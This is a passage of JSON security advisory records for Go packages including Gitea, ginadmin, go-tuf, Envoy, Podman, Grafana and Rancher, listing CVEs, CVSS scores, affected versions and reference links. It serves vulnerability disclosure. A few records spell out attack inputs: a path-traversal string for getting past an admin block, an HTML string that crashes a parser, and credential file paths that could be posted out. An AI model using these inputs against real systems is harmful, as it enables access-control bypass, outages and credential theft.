"PACKAGE", "url": "https://github.com/go-gitea/gitea/"}, {"type": "WEB", "url": "https://huntr.dev/bounties/6336ec42-5c4d-4f61-ae38-2bb539f433d2"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202210-14"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-06-02T20:36:41Z", "nvd_published_at": "2022-05-29T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p5f9-c9j9-g8qx", "modified": "2022-05-25T20:14:36Z", "published": "2022-05-17T00:01:46Z", "aliases": ["CVE-2022-30781"], "summary": "Shell command injection in gitea", "details": "Gitea before 1.16.7 does not escape the shell out for `git fetch remote` allowing for shell command injection", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30781"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/19487"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/19490"}, {"type": "WEB", "url": "https://blog.gitea.io/2022/05/gitea-1.16.7-is-released/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/168400/Gitea-1.16.6-Remote-Code-Execution.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/169928/Gitea-Git-Fetch-Remote-Code-Execution.html"}], "database_specific": {"cwe_ids": ["CWE-116"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-25T20:14:36Z", "nvd_published_at": "2022-05-16T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9pg5-3pjc-f8wm", "modified": "2022-06-09T22:56:10Z", "published": "2022-05-26T00:01:22Z", "aliases": ["CVE-2022-30427"], "summary": "Path traversal in ginadmin", "details": "In ginadmin through 05-10-2022 the incoming path value is not filtered, resulting in directory traversal. A [patch](https://github.com/gphper/ginadmin/commit/726109f01ad23523715f36f7d272958064666a30) is available on the `master` branch of the repository.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gphper/ginadmin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30427"}, {"type": "WEB", "url": "https://github.com/gphper/ginadmin/issues/8"}, {"type": "WEB", "url": "https://github.com/gphper/ginadmin/commit/726109f01ad23523715f36f7d272958064666a30"}, {"type": "PACKAGE", "url": "github.com/gphper/ginadmin"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-01T21:13:16Z", "nvd_published_at": "2022-05-25T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-66x3-6cw3-v5gj", "modified": "2022-05-24T20:50:46Z", "published": "2022-05-24T20:50:46Z", "aliases": ["CVE-2022-29173"], "summary": "Improper Validation of Integrity Check Value in go-tuf", "details": "### Impact\n\n[go-tuf](https://github.com/theupdateframework/go-tuf) does not correctly implement the [client workflow](https://theupdateframework.github.io/specification/v1.0.28/index.html#detailed-client-workflow) for updating the metadata files for roles other than the root role. Specifically, checks for rollback attacks are not implemented correctly meaning an attacker can cause clients to install software that is older than the software which the client previously knew to be available, and may include software with known vulnerabilities.\n\nIn more detail, the client code of go-tuf has several issues in regards to preventing rollback attacks:\n1. It does not take into account the content of any previously trusted metadata, if available, before proceeding with updating roles other than the root role (i.e., steps 5.4.3.1 and 5.5.5 of the detailed client workflow). This means that any form of version verification done on the newly-downloaded metadata is made using the default value of zero, which always passes. \n1. For both timestamp and snapshot roles, go-tuf saves these metadata files as trusted before verifying if the version of the metafiles they refer to is correct (i.e., steps 5.5.4 and 5.6.4 of the detailed client workflow).\n\n### Patches\n\nA fix is available in version 0.3.0 or newer.\n\n### Workarounds\n\nNo workarounds are known for this issue apart from upgrading.\n\n### References\n\n* Commit resolving the issue https://github.com/theupdateframework/go-tuf/commit/ed6788e710fc3093a7ecc2d078bf734c0f200d8d\n* TUF specification version against which this vulnerability is observed is [v.1.0.28](https://theupdateframework.github.io/specification/v1.0.28/index.html#detailed-client-workflow). For more details, refer to Section 5.\n* Codebase that is affected is [go-tuf@f0c3294f63b9145029464164f9bce49553b77cbb](https://github.com/theupdateframework/go-tuf/tree/f0c3294f63b9145029464164f9bce49553b77cbb)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-tuf](https://github.com/theupdateframework/go-tuf/issues)\n* Email us at TUF's [mailing list](mailto:theupdateframework@googlegroups.com)\n* The [#tuf](https://cloud-native.slack.com/archives/C8NMD3QJ3) channel on [CNCF Slack](https://slack.cncf.io/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/theupdateframework/go-tuf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-66x3-6cw3-v5gj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29173"}, {"type": "WEB", "url": "https://github.com/theupdateframework/go-tuf/commit/ed6788e710fc3093a7ecc2d078bf734c0f200d8d"}, {"type": "PACKAGE", "url": "https://github.com/theupdateframework/go-tuf"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0444"}], "database_specific": {"cwe_ids": ["CWE-354"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-24T20:50:46Z", "nvd_published_at": "2022-05-05T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p83v-8vmr-qfv9", "modified": "2023-10-06T15:48:41Z", "published": "2022-05-14T01:39:14Z", "aliases": ["CVE-2018-19295"], "summary": "Sylabs Singularity Improper Input Validation", "details": "Sylabs Singularity 2.4 to 2.6 allows local users to conduct Improper Input Validation attacks.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-19295"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/commit/9103f0155259fdf1159277bca3c2d347571cba0d"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/singularity"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/releases/tag/2.6.1"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-25T00:30:32Z", "nvd_published_at": "2018-12-17T15:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4x32-h296-rg6j", "modified": "2023-10-06T15:25:56Z", "published": "2022-05-14T01:01:38Z", "aliases": ["CVE-2018-12021"], "summary": "Singularity Incorrect Access Control ", "details": "Singularity 2.3.0 through 2.5.1 is affected by an incorrect access control on systems supporting overlay file system. When using the overlay option, a malicious user may access sensitive information by exploiting a few specific Singularity features.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hpcng/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-12021"}, {"type": "PACKAGE", "url": "https://github.com/singularityware/singularity"}, {"type": "WEB", "url": "https://github.com/singularityware/singularity/releases/tag/2.5.2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/05/16/1"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-22T00:00:49Z", "nvd_published_at": "2018-07-05T18:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5824-6jfv-xr3r", "modified": "2022-06-09T22:55:49Z", "published": "2022-05-26T00:01:22Z", "aliases": ["CVE-2022-30428"], "summary": "Arbitrary file read in ginadmin", "details": "In ginadmin through 05-10-2022, the incoming path value is not filtered, resulting in arbitrary file reading. A [patch](https://github.com/gphper/ginadmin/commit/726109f01ad23523715f36f7d272958064666a30) is available on the `master` branch of the repository.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gphper/ginadmin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30428"}, {"type": "WEB", "url": "https://github.com/gphper/ginadmin/issues/9"}, {"type": "WEB", "url": "https://github.com/gphper/ginadmin/commit/726109f01ad23523715f36f7d272958064666a30"}, {"type": "PACKAGE", "url": "github.com/gphper/ginadmin"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-552"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-01T21:12:49Z", "nvd_published_at": "2022-05-25T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w4xh-w33p-4v29", "modified": "2023-10-02T16:02:06Z", "published": "2022-05-14T00:55:16Z", "aliases": ["CVE-2017-17831"], "summary": "GitHub Git LFS Arbitrary command execution vulnerability", "details": "GitHub Git LFS before 2.1.1 allows remote attackers to execute arbitrary commands via an ssh URL with an initial dash character in the hostname, located on a `url =` line in a `.lfsconfig` file within a repository.\n### Specific Go Packages Affected\ngithub.com/git-lfs/git-lfs/lfsapi", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/git-lfs/git-lfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.1-0.20170519163204-f913f5f9c7c6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-17831"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/pull/2241"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/pull/2242"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/commit/f913f5f9c7c6d1301785fdf9884a2942d59cdf19"}, {"type": "WEB", "url": "https://confluence.atlassian.com/sourcetreekb/sourcetree-security-advisory-2018-01-24-942834324.html"}, {"type": "PACKAGE", "url": "https://github.com/git-lfs/git-lfs"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/releases/tag/v2.1.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0073"}, {"type": "WEB", "url": "https://web.archive.org/web/20200227131639/http://www.securityfocus.com/bid/102926"}, {"type": "WEB", "url": "http://blog.recurity-labs.com/2017-08-10/scm-vulns"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/102926"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:28:40Z", "nvd_published_at": "2017-12-21T06:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2wmf-p7f8-w42h", "modified": "2023-08-24T13:07:21Z", "published": "2022-05-24T16:44:38Z", "aliases": ["CVE-2019-9901"], "summary": "EnvoyProxy Envoy Missing HTTP URL path normalization", "details": "Envoy 1.9.0 and before does not normalize HTTP URL paths. A remote attacker may craft a relative path, e.g., `something/../admin`, to bypass access control, e.g., a block on `/admin`. A backend server could then interpret the non-normalized path and provide an attacker access beyond the scope provided for by the access control policy.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/envoyproxy/envoy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9.0"}}], "references": [{"type": "WEB", "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-9901"}, {"type": "WEB", "url": "https://github.com/envoyproxy/envoy/issues/6435"}, {"type": "WEB", "url": "https://github.com/envoyproxy/envoy/commit/e668e669677e52a00d99652b5a260d1cedafdfa8"}, {"type": "PACKAGE", "url": "https://github.com/envoyproxy/envoy"}, {"type": "WEB", "url": "https://github.com/envoyproxy/envoy/blob/main/security/postmortems/cve-2019-9900.md"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/envoy-announce/VoHfnDqZiAM"}, {"type": "WEB", "url": "https://www.envoyproxy.io/docs/envoy/v1.9.1/intro/version_history"}], "database_specific": {"cwe_ids": ["CWE-706"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-14T20:27:42Z", "nvd_published_at": "2019-04-25T16:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rh5f-2w6r-q7vj", "modified": "2023-08-25T21:29:12Z", "published": "2022-05-24T16:51:48Z", "aliases": ["CVE-2019-10152"], "summary": "Podman Path Traversal Vulnerability leads to arbitrary file read/write", "details": "A path traversal vulnerability has been discovered in podman before version 1.4.0 in the way it handles symlinks inside containers. An attacker who has compromised an existing container can cause arbitrary files on the host filesystem to be read/written when an administrator tries to copy a file from/to the container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-10152"}, {"type": "WEB", "url": "https://github.com/containers/libpod/issues/3211"}, {"type": "WEB", "url": "https://github.com/containers/libpod/pull/3214"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10152"}, {"type": "PACKAGE", "url": "https://github.com/containers/libpod"}, {"type": "WEB", "url": "https://github.com/containers/libpod/blob/master/RELEASE_NOTES.md#140"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00001.html"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-14T22:12:52Z", "nvd_published_at": "2019-07-30T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q7fx-wm2p-qfj8", "modified": "2023-06-09T23:23:59Z", "published": "2022-05-13T01:23:06Z", "aliases": ["CVE-2019-9764"], "summary": "HashiCorp Consul vulnerable to Origin Validation Error", "details": "HashiCorp Consul 1.4.3 lacks server hostname verification for agent-to-agent TLS communication. In other words, the product behaves as if `verify_server_hostname` were set to false, even when it is actually set to true. This is fixed in 1.4.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-9764"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/issues/5519"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/7e11dd82aa8dae505b7307adcb68c9d3194b3b40"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}], "database_specific": {"cwe_ids": ["CWE-346"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-06-09T23:23:59Z", "nvd_published_at": "2019-03-26T14:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jw82-xjgr-g6f8", "modified": "2023-08-23T21:44:47Z", "published": "2022-05-24T19:04:13Z", "withdrawn": "2023-08-23T21:44:47Z", "aliases": ["CVE-2020-1742"], "summary": "Withdrawn Advisory: kubernetes-nmstate Insecure Privilege Management", "details": "## Withdrawn Advisory\nThis advisory has been withdrawn. This link is maintained to preserve external references.\n\n## Original Description\nAn insecure modification vulnerability flaw was found in containers using nmstate/kubernetes-nmstate-handler. An attacker with access to the container could use this flaw to modify /etc/passwd and escalate their privileges. Versions before kubernetes-nmstate-handler-container-v2.3.0-30 are affected.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nmstate/kubernetes-nmstate"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 2.3.0-30"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-1742"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1803608"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-13T23:17:51Z", "nvd_published_at": "2021-06-07T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x5fh-fvvr-892f", "modified": "2023-10-06T15:53:46Z", "published": "2022-05-14T01:42:29Z", "aliases": ["CVE-2018-1000816"], "summary": "Grafana XSS Vulnerability", "details": "Grafana version confirmed for 5.2.4 and 5.3.0 contains a Cross Site Scripting (XSS) vulnerability in Influxdb and Graphite query editor that can result in Running arbitrary js code in victims browser.. This attack appear to be exploitable via Authenticated user must click on the input field where the payload was previously inserted..", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000816"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/issues/13667"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/pull/13670"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/eabb04cec21dc323347da1aab7fcbf2a6e9dd121"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-24T21:04:39Z", "nvd_published_at": "2018-12-20T15:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2wp2-chmh-r934", "modified": "2023-02-08T00:36:12Z", "published": "2022-05-13T01:19:23Z", "aliases": ["CVE-2018-17142"], "summary": "golang.org/x/net/html NULL Pointer Dereference vulnerability", "details": "The html package (aka x/net/html) through 2018-09-17 in Go mishandles <math><template><mo><template>, leading to a \"panic: runtime error\" in parseCurrentToken in parse.go during an html.Parse call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20180925071336-cf3bd585ca2a"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17142"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/27702"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go.dev/cl/136875"}, {"type": "WEB", "url": "https://go.dev/issue/27702"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/cf3bd585ca2a5a21b057abd8be7eea2204af89d0"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LREEWY6KNLHRWFZ7OT4HVLMVVCGGUHON/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKRCI7WIOCOCD3H7NXWRGIRABTQOZOBK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0192"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:36:12Z", "nvd_published_at": "2018-09-17T14:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r4m4-pmvw-m6j5", "modified": "2023-07-31T18:21:59Z", "published": "2022-05-13T01:25:56Z", "aliases": ["CVE-2016-5397"], "summary": "Apache Thrift Go Library Command Injection", "details": "The Apache Thrift Go client library exposed the potential during code generation for command injection due to using an external formatting tool. Affected Apache Thrift 0.9.3 and older, Fixed in Apache Thrift 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/thrift"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.3"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-5397"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:2669"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3140"}, {"type": "WEB", "url": "https://issues.apache.org/jira/browse/THRIFT-3893"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r4d3f1d3e333d9c2b2f6e6ae8ed8750d4de03410ac294bcd12c7eefa3@%3Ccommits.cassandra.apache.org%3E"}, {"type": "WEB", "url": "https://web.archive.org/web/20210124141102/http://www.securityfocus.com/bid/103025"}, {"type": "WEB", "url": "http://mail-archives.apache.org/mod_mbox/thrift-user/201701.mbox/raw/%3CCANyrgvc3W%3DMJ9S-hMZecPNzxkyfgNmuSgVfW2hdDSz5ke%2BOPhQ%40mail.gmail.com%3E"}], "database_specific": {"cwe_ids": ["CWE-77"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-31T18:21:59Z", "nvd_published_at": "2018-02-12T17:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gc62-j469-9gjm", "modified": "2023-08-01T23:31:39Z", "published": "2022-05-24T16:47:29Z", "aliases": ["CVE-2019-12274"], "summary": "Rancher Privilege Escalation Vulnerability", "details": "In Rancher 1 and 2 through 2.2.3, unprivileged users (if allowed to deploy nodes) can gain admin access to the Rancher management plane because node driver options intentionally allow posting certain data to the cloud. The problem is that a user could choose to post a sensitive file such as /root/.kube/config or /var/lib/rancher/management-state/cred/kubeconfig-system.yaml.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.2.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.27"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12274"}, {"type": "WEB", "url": "https://forums.rancher.com/t/rancher-release-v2-2-4-addresses-rancher-cve-2019-12274-and-cve-2019-12303/14466"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-01T23:31:39Z", "nvd_published_at": "2019-06-06T16:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f4w6-3rh6-6q4q", "modified": "2023-07-18T22:01:34Z", "published": "2022-05-24T17:02:42Z", "aliases": ["CVE-2019-11255"], "summary": "Kubernetes CSI Sidecar Containers Can Allow Unauthorized Data Access", "details": "Improper input validation in Kubernetes CSI sidecar containers for external-provisioner (<v0.4.3, <v1.0.2, v1.1, <v1.2.2, <v1.3.1), external-snapshotter (<v0.4.2, <v1.0.2, v1.1, <1.2.2), and external-resizer (v0.1, v0.2) could result in unauthorized PersistentVolume data access or volume mutation during snapshot, restore from snapshot, cloning and resizing operations.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-provisioner"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-provisioner"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-provisioner"}, "versions": ["1.1"]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-provisioner"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-provisioner"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-snapshotter/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-snapshotter/v6"}, "versions": ["1.1"]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-snapshotter/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-resizer"}, "versions": ["0.1"]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes-csi/external-resizer"}, "versions": ["0.2"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11255"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/85233"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4054"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4096"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4099"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4225"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-security-announce/aXiYN0q4uIw"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200810-0003/"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-18T22:01:34Z", "nvd_published_at": "2019-12-05T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c92w-72c5-9x59", "modified": "2023-02-08T00:31:28Z", "published": "2022-05-24T17:00:21Z", "aliases": ["CVE-2019-10223"], "summary": "kube-state-metrics may expose secret content in metrics", "details": "A security issue was discovered in the kube-state-metrics versions v1.7.0 and v1.7.1. An experimental feature was added to the v1.7.0 release that enabled annotations to be exposed as metrics. By default, the kube-state-metrics metrics only expose metadata about Secrets. However, a combination of the default `kubectl` behavior and this new feature can cause the entire secret content to end up in metric labels thus inadvertently exposing the secret content in metrics. This feature has been reverted and released as the v1.7.2 release. If you are running the v1.7.0 or v1.7.1 release, please upgrade to the v1.7.2 release as soon as possible.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kube-state-metrics"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-10223"}, {"type": "WEB", "url": "https://github.com/kubernetes/kube-state-metrics/commit/03122fe3e2df49a9a7298b8af921d3c37c430f7f"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10223"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kube-state-metrics"}, {"type": "WEB", "url": "https://github.com/kubernetes/kube-state-metrics/releases/tag/v1.7.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0621"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2019/08/09/1"}, {"type": "WEB", "url": 